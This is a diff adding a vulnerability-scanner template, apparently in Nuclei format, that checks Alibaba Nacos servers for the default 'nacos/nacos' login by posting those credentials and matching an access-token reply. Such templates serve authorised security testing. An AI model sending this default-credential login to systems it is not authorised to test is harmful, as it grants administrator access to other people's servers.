@@ -1,0 +1,33 @@
+id: alibaba-nacos-weak-pass
+info:
+  name: "Alibaba Nacos 默认弱口令漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: alibaba-nacos
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/nacos/v1/auth/users/login"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=nacos&password=nacos"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"accessToken\":"
+      - type: word
+        part: body
+        words:
+          - "\"username\":"
+          - "\"globalAdmin\":"
+        condition: or
+      - type: word
+        part: body
+        words:
+          - "</"
+        negative: true
